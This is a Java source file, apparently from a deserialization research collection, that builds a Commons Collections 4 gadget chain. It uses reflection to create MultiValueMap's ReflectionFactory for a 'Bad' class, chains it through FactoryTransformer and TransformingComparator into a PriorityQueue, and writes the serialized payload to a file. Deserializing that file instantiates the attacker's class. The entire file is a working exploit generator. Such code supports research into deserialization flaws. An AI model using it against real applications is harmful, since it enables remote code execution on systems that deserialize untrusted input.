package org.su18.serialize.ysoserial.CommonCollections.CommonCollections4;

import org.apache.commons.collections4.Factory;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.FactoryTransformer;
import org.su18.serialize.test.Bad;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * 彩蛋，群里看的，不知是否具有实战意义
 *
 * @author su18
 */
public class CC4WithFactoryTransformer {

	public static void main(String[] args) throws Exception {

		Class<?>    clazz       = Class.forName("org.apache.commons.collections4.map.MultiValueMap$ReflectionFactory");
		Constructor constructor = clazz.getDeclaredConstructor(Class.class);
		constructor.setAccessible(true);

		// 在实例化时，会触发目标类的 class 的 newInstance 创建类实例
		Factory factory = (Factory) constructor.newInstance(Bad.class);

		// 结合 CC4 的 FactoryTransformer
		FactoryTransformer factoryTransformer = new FactoryTransformer(factory);

		TransformingComparator comparator = new TransformingComparator(factoryTransformer);

		// 在初始化时不带入 comparator
		PriorityQueue<String> queue = new PriorityQueue<>(2);
		queue.add("1");
		queue.add("2");

		Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
		field.setAccessible(true);
		field.set(queue, comparator);

		SerializeUtil.writeObjectToFile(queue);
//		SerializeUtil.readFileObject();
	}

}
